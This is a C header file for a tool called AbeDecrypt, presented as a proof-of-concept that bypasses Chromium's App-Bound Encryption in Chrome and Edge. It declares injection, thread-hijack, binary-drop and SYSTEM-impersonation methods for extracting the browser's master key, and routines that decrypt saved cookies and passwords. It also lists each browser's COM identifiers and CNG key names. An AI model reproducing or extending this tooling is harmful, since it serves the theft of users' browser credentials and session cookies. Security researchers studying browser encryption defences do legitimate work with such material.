/*
 * AbeDecrypt: Chromium App-Bound Encryption bypass PoC (4 methods), GUI edition
 *
 * Browser/Profile/Method combo boxes, cookies & passwords list views and a
 * status control, laid out by the dialog resource (AbeDecrypt.rc). Browsers
 * and profiles are enumerated via the MLE Browser module (Net\Browser);
 * Local State is parsed via the MLE JSON module.
 *
 * Elevate requires admin (impersonates SYSTEM for the SYSTEM DPAPI layer and,
 * for the V3 envelope, the CNG unwrap of the cng_block). It supports all
 * three private envelope versions (V1 AES-GCM / V2 ChaCha20-Poly1305 / V3 CNG).
 * Drop requires admin for system-level browser installs (write to Program Files).
 * Inject launches the browser when it is not running.
 *
 * The Drop method copies this executable into the browser directory under its
 * own file name; the child copy detects the browser directory, runs the COM
 * payload and writes the key to the inherited stdout pipe.
 */

#pragma once

#define MLE_API
#define _USE_COMMCTL60

#include "../../KNSoft.MakeLifeEasier/MakeLifeEasier.h"

#include <windowsx.h>
#include <commctrl.h>
#include <bcrypt.h>
#include <dpapi.h>
#include <ncrypt.h>
#include <oleauto.h>
#include <roapi.h>

#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Comctl32.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Ncrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "runtimeobject.lib")

#include "resource.h"

/*** constants ***/

#define ABE_KEY_SIZE           32
#define ABE_LOCAL_STATE_MAX    (1 << 20)
#define ABE_REQUEST_BLOB_SIZE  2048
#define ABE_POLL_COUNT         2000
#define ABE_POLL_SLACK_MS      15

/* V1/V2 private envelope: version[1] + nonce[12] + ciphertext[32] + tag[16] */
#define ABE_V12_ENVELOPE_SIZE  61

/* V3 private envelope: version[1] + cng_block[32] + nonce[12] + ciphertext[32] + tag[16] */
#define ABE_V3_ENVELOPE_SIZE   93

typedef enum _ABE_METHOD { MethodDrop, MethodInject, MethodHijack, MethodElevate, MethodMax } ABE_METHOD;

/* ABE private data per browser type, indexed by NET_BROWSER_TYPE; the Browser
   module only provides the identity, it knows nothing about these details */
typedef struct _ABE_BROWSER
{
    PCWSTR CngKey;      /* persisted AES key in the SYSTEM profile KSP store (V3) */
    CLSID Clsid;
    IID Iid;
    ULONG DecryptSlot;
} ABE_BROWSER;

/* ABE private data, indexed by NET_BROWSER_TYPE */
static const ABE_BROWSER AbeBrowsers[NetBrowserMax] = {
    /* Edge */
    { L"Microsoft Edgekey1",
      {0x1FCBE96C,0x1697,0x43AF,{0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67}},
      {0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B}}, 8 },
    /* Chrome */
    { L"Google Chromekey1",
      {0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}},
      {0x1BF5208B,0x295F,0x4992,{0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38}}, 5 },
};

static const PCWSTR AbeMethodNames[MethodMax] = { L"Drop", L"Inject", L"Hijack", L"Elevate" };

/*** worker result ***/

typedef struct _ABE_RECORD
{
    WCHAR Version[16];
    WCHAR Site[256];
    WCHAR Name[160];
    WCHAR Value[2048];
} ABE_RECORD, *PABE_RECORD;

typedef struct _ABE_RESULT
{
    BOOL Ok;
    WCHAR Status[4096];
    PABE_RECORD Cookies;
    ULONG CookieCount;
    ULONG CookieCapacity;
    PABE_RECORD Passwords;
    ULONG PasswordCount;
    ULONG PasswordCapacity;
} ABE_RESULT, *PABE_RESULT;

/* running log target of the active worker */
extern PABE_RESULT g_AbeResult;

FORCEINLINE
VOID
AbeLog(
    _In_ _Printf_format_string_ PCWSTR Format,
    ...)
{
    WCHAR Stack[512];
    PWSTR Text = Stack;
    ULONG Length;
    PABE_RESULT Result = g_AbeResult;
    va_list Args;

    if (Result == NULL || wcslen(Result->Status) >= ARRAYSIZE(Result->Status) - 1)
    {
        return;
    }

    va_start(Args, Format);
    Length = Str_VPrintfExW(Text, ARRAYSIZE(Stack), Format, Args);
    va_end(Args);
    if (Length == 0 && Stack[0] == UNICODE_NULL)
    {
        Text = Mem_Alloc(sizeof(Result->Status));
        if (Text == NULL)
        {
            return;
        }
        va_start(Args, Format);
        Length = Str_VPrintfExW(Text, ARRAYSIZE(Result->Status), Format, Args);
        va_end(Args);
    }
    if (Length != 0)
    {
        Str_CatExW(Result->Status, ARRAYSIZE(Result->Status), Text);
    }
    if (Text != Stack)
    {
        Mem_Free(Text);
    }
}

/* formats a key as 64 hex digits plus the terminator */
FORCEINLINE
VOID
AbeFormatKeyHex(
    _In_reads_bytes_(ABE_KEY_SIZE) const BYTE* Key,
    _Out_writes_(ABE_KEY_SIZE * 2 + 1) PSTR Text)
{
    static const CHAR HexDigits[] = "0123456789ABCDEF";
    ULONG i;

    for (i = 0; i < ABE_KEY_SIZE; i++)
    {
        Text[i * 2] = HexDigits[Key[i] >> 4];
        Text[i * 2 + 1] = HexDigits[Key[i] & 0xF];
    }
    Text[ABE_KEY_SIZE * 2] = ANSI_NULL;
}

/* appends "!!! <Name> KEY: <hex> !!!" in one shot */
FORCEINLINE
VOID
AbeLogKey(
    _In_ PCWSTR Name,
    _In_reads_bytes_(ABE_KEY_SIZE) const BYTE* Key)
{
    CHAR Hex[ABE_KEY_SIZE * 2 + 1];

    AbeFormatKeyHex(Key, Hex);
    AbeLog(L"!!! %ls KEY: %hs !!!\r\n", Name, Hex);
}

/* creates the browser process with optional arguments and startup window state */
FORCEINLINE
_Success_(return != FALSE)
BOOL
AbeCreateBrowserProcessEx(
    _In_ PCWSTR ExePath,
    _In_opt_ PCWSTR Arguments,
    _In_ DWORD CreationFlags,
    _In_ WORD ShowWindow,
    _Out_ LPPROCESS_INFORMATION ProcessInformation)
{
    WCHAR CommandLine[MAX_PATH + 128];
    STARTUPINFOW Si;

    RtlZeroMemory(&Si, sizeof(Si));
    Si.cb = sizeof(Si);
    if (ShowWindow != SW_SHOWNORMAL)
    {
        Si.dwFlags = STARTF_USESHOWWINDOW;
        Si.wShowWindow = ShowWindow;
    }
    if (Arguments != NULL && Arguments[0] != UNICODE_NULL)
    {
        Str_PrintfExW(CommandLine, ARRAYSIZE(CommandLine), L"\"%ls\" %ls", ExePath, Arguments);
    } else
    {
        Str_PrintfExW(CommandLine, ARRAYSIZE(CommandLine), L"\"%ls\"", ExePath);
    }
    return CommandLine[0] != UNICODE_NULL &&
           CreateProcessInternalW(NULL,
                                  ExePath,
                                  CommandLine,
                                  NULL,
                                  NULL,
                                  FALSE,
                                  CreationFlags,
                                  NULL,
                                  NULL,
                                  &Si,
                                  ProcessInformation,
                                  NULL);
}

FORCEINLINE
_Success_(return != FALSE)
BOOL
AbeCreateBrowserProcess(
    _In_ PCWSTR ExePath,
    _In_ DWORD CreationFlags,
    _Out_ LPPROCESS_INFORMATION ProcessInformation)
{
    return AbeCreateBrowserProcessEx(ExePath,
                                     NULL,
                                     CreationFlags,
                                     SW_SHOWNORMAL,
                                     ProcessInformation);
}

/*** payload shared with the in-browser payload (Payload.c) ***/

/* request block patched into the mapped image before injection */
#pragma pack(push, 1)
typedef struct _ABE_REQUEST
{
    NET_BROWSER_TYPE BrowserType;
    ULONG BlobLength;                   /* APPB blob, prefix included */
    BYTE Blob[ABE_REQUEST_BLOB_SIZE];
} ABE_REQUEST, *PABE_REQUEST;
#pragma pack(pop)

extern volatile LONG g_Pending;             /* set when the payload finished */
extern volatile LONG g_Code;                /* payload result, 0 or HRESULT */
extern volatile BYTE g_Key[ABE_KEY_SIZE];   /* the v20 key */
extern volatile ABE_REQUEST g_Request;

_Success_(return != FALSE)
BOOL
AbePrepareRequest(
    _In_ const NET_BROWSER_INFO* Browser);

/* COM payload: runs inside the browser process (Hijack initial thread /
   Inject remote thread / Drop child in-browser-directory process) */
VOID
AbePayloadWorker(VOID);

/* remote entry points (address-taken for the mapped image) */
VOID
AbeHijackEntry(VOID);

DWORD WINAPI
AbeInjectEntry(LPVOID Param);

/*** self-map (SelfMap.c) ***/

_Success_(return != FALSE)
BOOL
AbeMapSelf(
    _In_ HANDLE Process,
    _Out_ PVOID* Mapped);

LONG
AbeWaitRemoteResult(
    _In_ HANDLE Process,
    _In_opt_ HANDLE WaitObject,
    _In_ PVOID Mapped,
    _In_ PVOID SelfBase,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key);

/*** methods ***/

_Success_(return != FALSE)
BOOL
AbeGetKeyHijack(
    _In_ const NET_BROWSER_INFO* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key);

_Success_(return != FALSE)
BOOL
AbeGetKeyInject(
    _In_ const NET_BROWSER_INFO* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key);

_Success_(return != FALSE)
BOOL
AbeGetKeyDrop(
    _In_ const NET_BROWSER_INFO* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key);

/* Drop child: runs from the browser directory, reports the key on stdout */
_Success_(return != FALSE)
BOOL
AbeDropChild(
    _In_ const NET_BROWSER_INFO* Browser);

/* on success EnvelopeVersion (optional) receives the private envelope
   version: 1, 2 or 3 (0 when the payload is a raw key, e.g. legacy Edge) */
_Success_(return != FALSE)
BOOL
AbeGetKeyElevate(
    _In_ const NET_BROWSER_INFO* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key,
    _Out_opt_ PULONG EnvelopeVersion);

/*** crypto (Crypto.c) ***/

NTSTATUS
AbeAesGcmOpen(
    _In_reads_bytes_(32) const BYTE* Key,
    _In_reads_bytes_(12) const BYTE* Nonce,
    _In_reads_bytes_(Length) const BYTE* CipherText,
    _In_ DWORD Length,
    _In_reads_bytes_(16) const BYTE* Tag,
    _Out_writes_bytes_(Length) PBYTE Plain);

NTSTATUS
AbeChaChaPoly1305Open(
    _In_reads_bytes_(32) const BYTE* Key,
    _In_reads_bytes_(12) const BYTE* Nonce,
    _In_reads_bytes_(Length) const BYTE* CipherText,
    _In_ DWORD Length,
    _In_reads_bytes_(16) const BYTE* Tag,
    _Out_writes_bytes_(Length) PBYTE Plain);

/* v10/v11/v20 column values: "vXX" + nonce[12] + ciphertext + tag[16] */
NTSTATUS
AbeGcmDecrypt(
    _In_reads_bytes_(32) const BYTE* Key,
    _In_reads_bytes_(Length) const BYTE* Value,
    _In_ DWORD Length,
    _Out_writes_bytes_(Length) PBYTE Plain);

/* reads os_crypt.<Field> of Local State, base64-decodes it into Blob
   (APPB/DPAPI prefix kept) */
_Success_(return != FALSE)
BOOL
AbeReadOsCryptBlob(
    _In_ PCWSTR UserDataDir,
    _In_ PCWSTR Field,
    _Out_writes_bytes_(BlobSize) PBYTE Blob,
    _In_ ULONG BlobSize,
    _Inout_ PULONG BlobLength);

/* v10 key (user DPAPI, always available) */
_Success_(return != FALSE)
BOOL
AbeGetV10Key(
    _In_ const NET_BROWSER_INFO* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key);

/*** database (Db.c) ***/

VOID
AbeCollectRecords(
    _In_ const NET_BROWSER_INFO* Browser,
    _In_ PCWSTR Profile,
    _In_z_ PCSTR DbFile,               /* "Network\\Cookies", "Login Data", "Login Data For Account" */
    _In_ LOGICAL IsCookie,
    _In_opt_ _In_reads_bytes_(ABE_KEY_SIZE) const BYTE* V10Key,
    _In_opt_ _In_reads_bytes_(ABE_KEY_SIZE) const BYTE* V20Key,
    _In_ ULONG V20EnvelopeVersion,     /* 0 = unknown, just show "v20" */
    _In_ LOGICAL Dedupe,               /* skip rows identical to already collected ones */
    _Inout_ PABE_RESULT Result);

/*** worker (Main.c) ***/

typedef struct _ABE_JOB
{
    NET_BROWSER_INFO Browser;
    ABE_METHOD Method;
    PABE_RESULT Result;
    WCHAR Profile[MAX_PATH];
} ABE_JOB, *PABE_JOB;

DWORD WINAPI
AbeWorker(
    _In_ LPVOID Parameter);

/*** UI (Ui.c) ***/

extern HWND g_MainWindow;
extern PNET_BROWSER_INFO g_Browsers;
extern ULONG g_BrowserCount;

INT_PTR CALLBACK
AbeDialogProc(
    _In_ HWND Window,
    _In_ UINT Message,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam);

#define ABE_WM_RESULT   (WM_APP + 1)
